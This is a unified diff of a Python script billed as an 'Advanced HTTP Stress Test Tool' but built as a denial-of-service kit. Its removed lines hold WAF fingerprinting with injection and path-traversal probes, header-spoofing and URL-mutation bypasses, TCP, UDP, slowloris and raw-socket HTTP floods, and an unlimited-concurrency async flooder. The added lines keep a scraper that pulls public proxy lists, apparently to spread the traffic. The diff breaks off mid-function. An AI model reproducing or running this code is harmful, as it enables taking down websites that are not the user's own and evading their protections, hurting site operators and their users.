@@ -1,769 +1,64 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""
-╔══════════════════════════════════════════════════════════╗
-║  ROOT.PY v4.0 - Advanced HTTP Stress Test Tool          ║
-║  Async + Raw Socket | WAF Bypass | Auto Proxy            ║
-╚══════════════════════════════════════════════════════════╝
-"""
-import sys, os, subprocess, importlib, importlib.util, argparse, time, json, re
-import threading, random, socket
-
-__version__ = "4.0.0"
-
-# ── Dependency Management ──
-REQUIRED = {"requests":"requests","aiohttp":"aiohttp","bs4":"beautifulsoup4"}
-
+import sys,os,subprocess,importlib,importlib.util,argparse,time,json,re,threading,random,socket,ssl,struct,string
+__version__="4.0.0"
+REQUIRED={"requests":"requests","aiohttp":"aiohttp"}
 def ensure_deps():
-    missing = {}
-    for i,p in REQUIRED.items():
-        try: importlib.import_module(i)
-        except ImportError: missing[i] = p
-    if not missing: return
-    print("\n" + "="*55 + "\n  MISSING DEPENDENCIES\n" + "="*55)
-    for idx,(i,p) in enumerate(missing.items(),1): print(f"    {idx}. {p:<25} ({i})")
+    missing={i:p for i,p in REQUIRED.items() if importlib.util.find_spec(i) is None}
+    if not missing:return
+    print("\n"+"="*55+"\n  MISSING DEPENDENCIES\n"+"="*55)
+    for idx,(i,p) in enumerate(missing.items(),1):print(f"    {idx}. {p:<25} ({i})")
     print("-"*55)
     while True:
-        try: a = input("  Install now? [Y/n]: ").strip().lower()
-        except (EOFError,KeyboardInterrupt): sys.exit(1)
-        if a in ("","y","yes","e","evet"): break
-        if a in ("n","no","h","hayir"): sys.exit(1)
-    try: subprocess.check_call([sys.executable,"-m","pip","install","--upgrade","pip","--quiet"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
-    except: pass
+        try:a=input("  Install now? [Y/n]: ").strip().lower()
+        except:sys.exit(1)
+        if a in("","y","yes","e","evet"):break
+        if a in("n","no","h","hayir"):sys.exit(1)
     for i,p in missing.items():
         print(f"    -> {p} ... ",end="",flush=True)
-        try:
-            subprocess.check_call([sys.executable,"-m","pip","install",p,"--quiet"],stdout=subprocess.DEVNULL,stderr=subprocess.PIPE)
-            print("OK")
-        except: print("FAIL"); sys.exit(1)
+        try:subprocess.check_call([sys.executable,"-m","pip","install",p,"--quiet"],stdout=subprocess.DEVNULL,stderr=subprocess.PIPE);print("OK")
+        except:print("FAIL");sys.exit(1)
     print("[+] Ready!\n")
-
 ensure_deps()
-
-import asyncio, requests
-import asyncio, ssl, struct, string
-from urllib.parse import urlparse, urlencode, quote
-
-
-# ========================================================
-#  WAF ENGINE
-# ========================================================
-
-
-
-# ══════════════════════════════════════════════════════════
-#  WAF SIGNATURES DATABASE
-# ══════════════════════════════════════════════════════════
-
-WAF_SIGNATURES = {
-    "Cloudflare": {
-        "headers": ["cf-ray", "cf-cache-status", "cf-request-id", "__cfduid"],
-        "cookies": ["__cfduid", "cf_clearance", "__cf_bm"],
-        "body": ["cloudflare", "cf-browser-verification", "ray ID", "Attention Required"],
-        "codes": [403, 503, 1020],
-    },
-    "AWS WAF": {
-        "headers": ["x-amzn-requestid", "x-amz-cf-id", "x-amz-apigw-id"],
-        "cookies": ["awsalb", "awsalbcors"],
-        "body": ["aws", "Request blocked", "automated access"],
-        "codes": [403],
-    },
-    "Akamai": {
-        "headers": ["x-akamai-transformed", "akamai-grn", "x-akamai-session-info"],
-        "cookies": ["akamai", "ak_bmsc", "bm_sv", "bm_sz"],
-        "body": ["akamai", "Access Denied", "Reference#"],
-        "codes": [403],
-    },
-    "Sucuri": {
-        "headers": ["x-sucuri-id", "x-sucuri-cache", "server:sucuri"],
-        "cookies": ["sucuri_cloudproxy"],
-        "body": ["sucuri", "cloudproxy", "Access Denied - Sucuri"],
-        "codes": [403],
-    },
-    "Imperva/Incapsula": {
-        "headers": ["x-iinfo", "x-cdn"],
-        "cookies": ["incap_ses", "visid_incap", "nlbi_"],
-        "body": ["incapsula", "imperva", "_Incapsula_Resource"],
-        "codes": [403],
-    },
-    "ModSecurity": {
-        "headers": ["server:mod_security"],
-        "body": ["mod_security", "modsecurity", "NOYB", "not acceptable"],
-        "codes": [403, 406],
-    },
-    "F5 BIG-IP": {
-        "headers": ["x-wa-info", "server:bigip"],
-        "cookies": ["ts", "bigipserver", "f5_cspm"],
-        "body": ["the requested url was rejected", "request rejected"],
-        "codes": [403],
-    },
-    "Barracuda": {
-        "headers": ["server:barracuda"],
-        "cookies": ["barra_counter_session"],
-        "body": ["barracuda", "you have been blocked"],
-        "codes": [403],
-    },
-    "Fortinet/FortiWeb": {
-        "headers": ["server:fortiweb"],
-        "cookies": ["fortiwafsid", "cookiesession1"],
-        "body": ["fortigate", "fortiweb", ".fgtres"],
-        "codes": [403],
-    },
-    "Wordfence": {
-        "headers": [],
-        "cookies": ["wfvt_", "wordfence_verifiedHuman"],
-        "body": ["wordfence", "generated by wordfence", "Your access to this site has been limited"],
-        "codes": [403, 503],
-    },
-    "DDoS-Guard": {
-        "headers": ["server:ddos-guard"],
-        "cookies": ["__ddg1", "__ddg2", "__ddgid", "__ddgmark"],
-        "body": ["ddos-guard", "ddos protection by"],
-        "codes": [403],
-    },
-    "Comodo": {
-        "headers": ["server:comodo"],
-        "body": ["comodo waf", "protected by comodo"],
-        "codes": [403],
-    },
-    "StackPath": {
-        "headers": ["x-sp-url", "x-sp-wl"],
-        "cookies": ["sp_wl"],
-        "body": ["stackpath", "you performed an action that triggered"],
-        "codes": [403],
-    },
-    "Varnish": {
-        "headers": ["x-varnish", "via:varnish"],
-        "body": ["varnish cache server", "guru meditation"],
-        "codes": [403, 503],
-    },
-    "Reblaze": {
-        "headers": ["server:reblaze"],
-        "cookies": ["rbzid"],
-        "body": ["reblaze", "access denied (443)"],
-        "codes": [403],
-    },
-}
-
-# ══════════════════════════════════════════════════════════
-#  WAF DETECTOR
-# ══════════════════════════════════════════════════════════
-
-def detect_waf(response):
-    detected = []
-    if response is None:
-        return detected
-
-    resp_headers = {k.lower(): v.lower() for k, v in response.headers.items()}
-    resp_cookies = {k.lower(): v for k, v in response.cookies.items()}
-    resp_body = response.text.lower()[:5000]
-    resp_code = response.status_code
-
-    for waf_name, sigs in WAF_SIGNATURES.items():
-        score = 0
-
-        # Check headers
-        for h in sigs.get("headers", []):
-            if ":" in h:
-                key, val = h.split(":", 1)
-                if key in resp_headers and val in resp_headers[key]:
-                    score += 3
-            elif h in resp_headers:
-                score += 2
-
-        # Check cookies
-        for c in sigs.get("cookies", []):
-            for cookie_name in resp_cookies:
-                if c in cookie_name:
-                    score += 3
-                    break
-
-        # Check body
-        for b in sigs.get("body", []):
-            if b.lower() in resp_body:
-                score += 2
-
-        # Check status code
-        if resp_code in sigs.get("codes", []):
-            score += 1
-
-        if score >= 3:
-            detected.append((waf_name, score))
-
-    detected.sort(key=lambda x: x[1], reverse=True)
-    return detected
-
-
-def scan_waf(url, session=None):
-    """Send probe requests to detect WAF on target."""
-    import requests as req
-
-    if session is None:
-        session = req.Session()
-
-    results = {"detected": [], "status": None, "server": None}
-
-    # Probe 1: Normal request
-    try:
-        r = session.get(url, timeout=10, allow_redirects=True)
-        results["status"] = r.status_code
-        results["server"] = r.headers.get("Server", "Unknown")
-        wafs = detect_waf(r)
-        for w, s in wafs:
-            if w not in [x[0] for x in results["detected"]]:
-                results["detected"].append((w, s))
-    except Exception:
-        pass
-
-    # Probe 2: Malicious-looking request (trigger WAF)
-    probes = [
-        url + "?id=1' OR '1'='1",
-        url + "?test=<script>alert(1)</script>",
-        url + "?cmd=../../../etc/passwd",
-        url + "?page=..%2f..%2f..%2fetc%2fpasswd",
-    ]
-    for probe_url in probes:
-        try:
-            r = session.get(probe_url, timeout=8, allow_redirects=True, headers={
-                "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1)"
-            })
-            wafs = detect_waf(r)
-            for w, s in wafs:
-                if w not in [x[0] for x in results["detected"]]:
-                    results["detected"].append((w, s))
-        except Exception:
-            pass
-
-    return results
-
-
-# ══════════════════════════════════════════════════════════
-#  BYPASS STRATEGY BUILDER
-# ══════════════════════════════════════════════════════════
-
-def _rand_str(n=8):
-    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
-
-def _rand_path():
-    segments = random.randint(1, 4)
-    return '/'.join(_rand_str(random.randint(3, 10)) for _ in range(segments))
-
-def _rand_query(n=3):
-    params = {}
-    for _ in range(n):
-        params[_rand_str(5)] = _rand_str(random.randint(5, 20))
-    return urlencode(params)
-
-
-class BypassStrategy:
-    """Generates bypass-tuned headers, URLs, and payloads based on detected WAF."""
-
-    def __init__(self, waf_name=None):
-        self.waf = waf_name
-
-    def get_headers(self):
-        """Generate bypass headers based on WAF type."""
-        base = {
-            "User-Agent": random.choice(BYPASS_USER_AGENTS),
-            "Accept": random.choice([
-                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-                "*/*",
-            ]),
-            "Accept-Language": random.choice([
-                "en-US,en;q=0.9", "en-GB,en;q=0.8", "de-DE,de;q=0.9",
-                "fr-FR,fr;q=0.9", "tr-TR,tr;q=0.9", "es-ES,es;q=0.9",
-            ]),
-            "Accept-Encoding": random.choice(["gzip, deflate", "gzip, deflate, br", "identity"]),
-            "Connection": random.choice(["keep-alive", "close"]),
-            "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
-            "Referer": random.choice(BYPASS_REFERERS),
-        }
-
-        # WAF-specific bypass headers
-        if self.waf == "Cloudflare":
-            base["X-Forwarded-For"] = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
-            base["X-Originating-IP"] = base["X-Forwarded-For"]
-            base["X-Real-IP"] = base["X-Forwarded-For"]
-            base["CF-Connecting-IP"] = base["X-Forwarded-For"]
-
-        elif self.waf in ("AWS WAF", "Akamai"):
-            base["X-Forwarded-For"] = f"127.0.0.{random.randint(1,254)}"
-            base["X-Custom-IP-Authorization"] = "127.0.0.1"
-            base["X-Original-URL"] = "/"
-            base["X-Rewrite-URL"] = "/"
-
-        elif self.waf in ("Imperva/Incapsula", "Sucuri"):
-            base["X-Forwarded-For"] = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
-            base["X-Forwarded-Host"] = urlparse(base.get("Referer", "http://google.com")).hostname
-            base["True-Client-IP"] = base["X-Forwarded-For"]
-
-        elif self.waf == "ModSecurity":
-            base["Content-Type"] = random.choice([
-                "application/x-www-form-urlencoded",
-                "multipart/form-data; boundary=" + _rand_str(16),
-                "text/plain",
-            ])
-
-        elif self.waf in ("F5 BIG-IP", "Barracuda"):
-            base["X-Forwarded-For"] = f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"
-            base["X-Originating-IP"] = base["X-Forwarded-For"]
-
-        elif self.waf == "Wordfence":
-            base["X-Forwarded-For"] = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
-
-        elif self.waf == "DDoS-Guard":
-            base["X-Forwarded-For"] = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
-            base["X-Real-IP"] = base["X-Forwarded-For"]
-
-        # Generic evasion for all
-        if random.random() < 0.3:
-            base["X-Forwarded-Proto"] = random.choice(["http", "https"])
-        if random.random() < 0.2:
-            base["Via"] = f"1.1 {_rand_str(8)}"
-
-        return base
-
-    def mutate_url(self, url):
-        """Apply URL mutation techniques to bypass path-based rules."""
-        parsed = urlparse(url)
-        path = parsed.path or "/"
-        mutations = [
-            lambda p: p,  # no change
-            lambda p: p + "?" + _rand_query(random.randint(1, 5)),
-            lambda p: p + "/" + _rand_str(4),
-            lambda p: p + ";jsessionid=" + _rand_str(32),
-            lambda p: p.replace("/", "//", 1) if "/" in p[1:] else p,
-            lambda p: p + "#" + _rand_str(6),
-            lambda p: p + "/.." + p,
-        ]
-        mutator = random.choice(mutations)
-        new_path = mutator(path)
-        return f"{parsed.scheme}://{parsed.netloc}{new_path}"
-
-    def get_method(self):
-        """Return HTTP method - mostly GET but occasionally others."""
-        weights = [("GET", 70), ("HEAD", 10), ("POST", 10), ("OPTIONS", 5), ("PATCH", 5)]
-        methods, w = zip(*weights)
-        return random.choices(methods, weights=w, k=1)[0]
-
-    def get_post_data(self):
-        """Generate random POST body data."""
-        return {_rand_str(5): _rand_str(random.randint(10, 50)) for _ in range(random.randint(2, 6))}
-
-
-# ══════════════════════════════════════════════════════════
-#  BYPASS USER AGENTS & REFERERS (realistic, diverse)
-# ══════════════════════════════════════════════════════════
-
-BYPASS_USER_AGENTS = [
-    # Chrome variants
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
-    # Firefox
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
-    # Safari
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
-    # Edge
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
-    # Mobile
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
-    # Bots (sometimes bypass WAF bot-allow rules)
-    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
-    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
+import asyncio,requests,aiohttp
+from urllib.parse import urlparse,urlencode
+SCRIPT_DIR=os.path.dirname(os.path.abspath(__file__))
+PROXY_FILE=os.path.join(SCRIPT_DIR,"proxies.txt")
+PROXY_SOURCES=[
+("ProxyScrape HTTP","https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",""),
+("SpeedX HTTP","https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",""),
+("SpeedX SOCKS4","https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt","socks4://"),
+("SpeedX SOCKS5","https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt","socks5://"),
+("Monosans HTTP","https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",""),
+("Monosans SOCKS4","https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt","socks4://"),
+("Monosans SOCKS5","https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt","socks5://"),
+("Clarketm HTTP","https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",""),
 ]
-
-BYPASS_REFERERS = [
-    "https://www.google.com/search?q=site:",
-    "https://www.google.com/",
-    "https://www.bing.com/search?q=",
-    "https://www.yahoo.com/",
-    "https://duckduckgo.com/",
-    "https://www.facebook.com/",
-    "https://twitter.com/",
-    "https://www.linkedin.com/",
-    "https://www.reddit.com/",
-    "https://t.co/",
-    "",  # empty referer
-]
-
-
-# ══════════════════════════════════════════════════════════
-#  ATTACK METHODS
-# ══════════════════════════════════════════════════════════
-
-def slowloris_headers():
-    """Generate headers for slowloris-style slow attack."""
-    return {
-        "User-Agent": random.choice(BYPASS_USER_AGENTS),
-        "Accept-Language": "en-US,en;q=0.5",
-        "Connection": "keep-alive",
-        "Keep-Alive": str(random.randint(300, 1000)),
-        "Content-Length": str(random.randint(1, 10000)),
-        "X-a": str(random.randint(1, 5000)),
-    }
-
-def cache_bust_url(url):
-    """Add cache-busting parameter to URL."""
-    sep = "&" if "?" in url else "?"
-    return f"{url}{sep}_{_rand_str(6)}={int(time.time())}"
-
-# ========================================================
-#  ATTACK ENGINE
-# ========================================================
-
-
-
-# ══════════════════════════════════════════════════════════
-#  PERFORMANCE TUNED RAW SOCKET FLOODS
-# ══════════════════════════════════════════════════════════
-
-def _rand(n=8):
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
-
-def _rand_ip():
-    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
-
-def _rand_port():
-    return random.randint(1024, 65535)
-
-
-class RawFlooder:
-
-    @staticmethod
-    def tcp_flood(host, port, duration=0):
-        """High-speed TCP SYN flood using raw sockets."""
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(4)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
-            s.connect((host, port))
-            payload = random._urandom(random.randint(64, 1024))
-            s.send(payload)
-            s.close()
-            return True
-        except:
-            try: s.close()
-            except: pass
-            return False
-
-    @staticmethod
-    def udp_flood(host, port):
-        """UDP flood with random payloads."""
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            payload = random._urandom(random.randint(64, 65500))
-            s.sendto(payload, (host, port))
-            s.close()
-            return True
-        except:
-            try: s.close()
-            except: pass
-            return False
-
-    @staticmethod
-    def slowloris_connect(host, port):
-        """Slowloris - hold connection open with partial headers."""
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(10)
-            s.connect((host, port))
-            s.send(f"GET /?{random.randint(1,99999)} HTTP/1.1\r\n".encode())
-            s.send(f"Host: {host}\r\n".encode())
-            s.send(f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(90,121)}.0.0.0\r\n".encode())
-            s.send(f"Accept-Language: en-US,en;q=0.{random.randint(5,9)}\r\n".encode())
-            s.send(f"Connection: keep-alive\r\n".encode())
-            s.send(f"Keep-Alive: {random.randint(300,1200)}\r\n".encode())
-            s.send(f"Content-Length: {random.randint(100,10000)}\r\n".encode())
-            return s  # Return socket to keep it open
-        except:
-            try: s.close()
-            except: pass
-            return None
-
-    @staticmethod
-    def socket_http_flood(host, port, path="/", use_ssl=False):
-        """Raw socket HTTP flood - bypasses requests library overhead."""
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(5)
-            if use_ssl:
-                ctx = ssl.create_default_context()
-                ctx.check_hostname = False
-                ctx.verify_mode = ssl.CERT_NONE
-                s = ctx.wrap_socket(s, server_hostname=host)
-            s.connect((host, port))
-
-            # Build raw HTTP request
-            rand_path = f"{path}?{'&'.join(f'{_rand(4)}={_rand(8)}' for _ in range(random.randint(1,5)))}"
-            ua = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{random.randint(100,121)}.0.{random.randint(1000,9999)}.{random.randint(10,200)} Safari/537.36"
-            
-            request = (
-                f"GET {rand_path} HTTP/1.1\r\n"
-                f"Host: {host}\r\n"
-                f"User-Agent: {ua}\r\n"
-                f"Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n"
-                f"Accept-Encoding: gzip, deflate\r\n"
-                f"Accept-Language: en-US,en;q=0.9\r\n"
-                f"Cache-Control: no-cache\r\n"
-                f"Referer: https://www.google.com/\r\n"
-                f"X-Forwarded-For: {_rand_ip()}\r\n"
-                f"Connection: keep-alive\r\n"
-                f"\r\n"
-            )
-            s.send(request.encode())
-            s.close()
-            return True
-        except:
-            try: s.close()
-            except: pass
-            return False
-
-    @staticmethod
-    def socket_post_flood(host, port, path="/", use_ssl=False):
-        """Raw socket POST flood with random body."""
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(5)
-            if use_ssl:
-                ctx = ssl.create_default_context()
-                ctx.check_hostname = False
-                ctx.verify_mode = ssl.CERT_NONE
-                s = ctx.wrap_socket(s, server_hostname=host)
-            s.connect((host, port))
-
-            body = '&'.join(f'{_rand(6)}={_rand(random.randint(10,100))}' for _ in range(random.randint(3,10)))
-            ua = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{random.randint(100,122)}.0) Gecko/20100101 Firefox/{random.randint(100,122)}.0"
-
-            request = (
-                f"POST {path} HTTP/1.1\r\n"
-                f"Host: {host}\r\n"
-                f"User-Agent: {ua}\r\n"
-                f"Content-Type: application/x-www-form-urlencoded\r\n"
-                f"Content-Length: {len(body)}\r\n"
-                f"Accept: */*\r\n"
-                f"X-Forwarded-For: {_rand_ip()}\r\n"
-                f"Connection: keep-alive\r\n"
-                f"\r\n"
-                f"{body}"
-            )
-            s.send(request.encode())
-            s.close()
-            return True
-        except:
-            try: s.close()
-            except: pass
-            return False
-
-
-# ══════════════════════════════════════════════════════════
-#  ASYNC HTTP ENGINE (aiohttp)
-# ══════════════════════════════════════════════════════════
-
-async def async_http_flood(session, url, bypass_strategy=None, method="GET"):
-    """Single async HTTP request with bypass headers."""
-    try:
-        if bypass_strategy:
-            headers = bypass_strategy.get_headers()
-            target = bypass_strategy.mutate_url(url)
-        else:
-            headers = {
-                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(100,121)}.0.0.0 Safari/537.36",
-                "X-Forwarded-For": _rand_ip(),
-                "Cache-Control": "no-cache",
-            }
-            target = url
-
-        # Cache bust
-        sep = "&" if "?" in target else "?"
-        target = f"{target}{sep}_={_rand(6)}"
-
-        if method == "GET":
-            async with session.get(target, headers=headers, timeout=8, ssl=False) as resp:
-                await resp.read()
-                return resp.status < 400
-        elif method == "POST":
-            data = {_rand(5): _rand(20) for _ in range(random.randint(2,8))}
-            async with session.post(target, headers=headers, data=data, timeout=8, ssl=False) as resp:
-                await resp.read()
-                return resp.status < 400
-        elif method == "HEAD":
-            async with session.head(target, headers=headers, timeout=8, ssl=False) as resp:
-                return resp.status < 400
-    except:
-        return False
-
-
-async def async_flood_worker(session, url, bypass_strategy, stats, stop_event, method="GET"):
-    """Continuous async flood worker."""
-    methods = ["GET", "POST", "HEAD"] if method == "MIXED" else [method]
-    while not stop_event.is_set():
-        m = random.choice(methods)
-        result = await async_http_flood(session, url, bypass_strategy, m)
-        stats["total"] += 1
-        if result:
-            stats["success"] += 1
-        else:
-            stats["fail"] += 1
-
-
-async def run_async_flood(url, concurrency, bypass_strategy, stats, stop_event, method="GET"):
-    """Launch async flood with high concurrency."""
-    try:
-        import aiohttp
-        connector = aiohttp.TCPConnector(
-            limit=0,  # No connection limit
-            limit_per_host=0,
-            ttl_dns_cache=300,
-            enable_cleanup_closed=True,
-            force_close=False,
-            keepalive_timeout=30,
-        )
-        timeout = aiohttp.ClientTimeout(total=10, connect=5)
-        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-            tasks = []
-            for _ in range(concurrency):
-                task = asyncio.ensure_future(
-                    async_flood_worker(session, url, bypass_strategy, stats, stop_event, method)
-                )
-                tasks.append(task)
-            await asyncio.gather(*tasks, return_exceptions=True)
-    except ImportError:
-        # Fallback if aiohttp not available
-        pass
-
-
-# ══════════════════════════════════════════════════════════
-#  THREAD-BASED RAW SOCKET WORKERS
-# ══════════════════════════════════════════════════════════
-
-
-def raw_http_worker(host, port, path, use_ssl, stats, stop_event, method="GET"):
-    """Thread worker for raw socket HTTP flood."""
-    flooder = RawFlooder()
-    while not stop_event.is_set():
-        if method == "GET":
-            ok = flooder.socket_http_flood(host, port, path, use_ssl)
-        elif method == "POST":
-            ok = flooder.socket_post_flood(host, port, path, use_ssl)
-        elif method == "MIXED":
-            if random.random() < 0.6:
-                ok = flooder.socket_http_flood(host, port, path, use_ssl)
-            else:
-                ok = flooder.socket_post_flood(host, port, path, use_ssl)
-        else:
-            ok = flooder.socket_http_flood(host, port, path, use_ssl)
-        stats["total"] += 1
-        if ok: stats["success"] += 1
-        else: stats["fail"] += 1
-
-
-def tcp_worker(host, port, stats, stop_event):
-    """Thread worker for TCP flood."""
-    flooder = RawFlooder()
-    while not stop_event.is_set():
-        ok = flooder.tcp_flood(host, port)
-        stats["total"] += 1
-        if ok: stats["success"] += 1
-        else: stats["fail"] += 1
-
-
-def udp_worker(host, port, stats, stop_event):
-    """Thread worker for UDP flood."""
-    flooder = RawFlooder()
-    while not stop_event.is_set():
-        ok = flooder.udp_flood(host, port)
-        stats["total"] += 1
-        if ok: stats["success"] += 1
-        else: stats["fail"] += 1
-
-
-def slowloris_worker(host, port, stats, stop_event):
-    """Thread worker for slowloris attack."""
-    flooder = RawFlooder()
-    sockets = []
-    while not stop_event.is_set():
-        # Open new connections
-        for _ in range(random.randint(5, 20)):
-            s = flooder.slowloris_connect(host, port)
-            if s:
-                sockets.append(s)
-                stats["total"] += 1
-                stats["success"] += 1
-        # Keep existing connections alive
-        alive = []
-        for s in sockets:
-            try:
-                s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
-                alive.append(s)
-            except:
-                stats["fail"] += 1
-                try: s.close()
-                except: pass
-        sockets = alive
-        time.sleep(random.uniform(5, 15))
-    # Cleanup
-    for s in sockets:
-        try: s.close()
-        except: pass
-
-# ========================================================
-#  MAIN APPLICATION
-# ========================================================
-
-
-
-# ══════════════════════════════════════════════════════════
-#  PROXY MANAGER (compact)
-# ══════════════════════════════════════════════════════════
-SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
-PROXY_FILE = os.path.join(SCRIPT_DIR, "proxies.txt")
-
-PROXY_SOURCES = [
-    ("ProxyScrape HTTP","https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",""),
-    ("ProxyScrape SOCKS4","https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all","socks4://"),
-    ("ProxyScrape SOCKS5","https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all","socks5://"),
-    ("SpeedX HTTP","https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",""),
-    ("SpeedX SOCKS4","https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt","socks4://"),
-    ("SpeedX SOCKS5","https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt","socks5://"),
-    ("Monosans HTTP","https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",""),
-    ("Monosans SOCKS4","https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt","socks4://"),
-    ("Monosans SOCKS5","https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt","socks5://"),
-    ("Clarketm HTTP","https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",""),
-]
-
-proxy_list = []
-proxy_lock = threading.Lock()
-
+proxy_list=[]
+proxy_lock=threading.Lock()
 def _fetch_src(name,url,prefix):
     px=[]
     try:
-        r=requests.get(url,timeout=15); r.raise_for_status()
+        r=requests.get(url,timeout=20,verify=True)
+        r.raise_for_status()
         for ln in r.text.strip().splitlines():
             ln=ln.strip()
-            if not ln or ln.startswith("#"): continue
+            if not ln or ln.startswith("#"):continue
             if ":" in ln:
                 p=(prefix+ln) if prefix and not ln.startswith("socks") else ln
-                if not p.startswith(("http://","https://","socks4://","socks5://")): p="http://"+p
+                if not p.startswith(("http://","https://","socks4://","socks5://")):p="http://"+p
                 px.append(p)
-    except: pass
+    except Exception as e:
+        pass
     return px
-
 def update_proxies():
     global proxy_list
     print("\n"+"="*55+"\n  PROXY UPDATE\n"+"="*55)
-    res={}; threads=[]
-    def w(i,n,u,p): res[i]=_fetch_src(n,u,p)
+    res={};threads=[]
+    def w(i,n,u,p):res[i]=_fetch_src(n,u,p)
     for i,(n,u,p) in enumerate(PROXY_SOURCES):
-        t=threading.Thread(target=w,args=(i,n,u,p)); t.start(); threads.append(t)
-    for t in threads: t.join(timeout=30)
+        t=threading.Thread(target=w,args=(i,n,u,p));t.start();threads.append(t)
+    for t in threads:t.join(timeout=30)
     all_p=[]
     for i,(n,_,_) in enumerate(PROXY_SOURCES):
         got=res.get(i,[])
@@ -772,362 +67,273 @@ def update_proxies():
     proxy_list=list(dict.fromkeys(all_p))
     if proxy_list:
         with open(PROXY_FILE,"w") as f:
-            for p in proxy_list: f.write(p+"\n")
+            for p in proxy_list:f.write(p+"\n")
         print(f"\n[+] {len(proxy_list)} proxies loaded")
     else:
         if os.path.exists(PROXY_FILE):
-            with open(PROXY_FILE) as f: proxy_list=[l.strip() for l in f if l.strip() and not l.startswith("#")]
-            print(f"[*] Using {len(proxy_list)} cached proxies")
-        else:
-            print("[!] No proxies")
+            with open(PROXY_FILE) as f:proxy_list=[l.strip() for l in f if l.strip() and not l.startswith("#")]
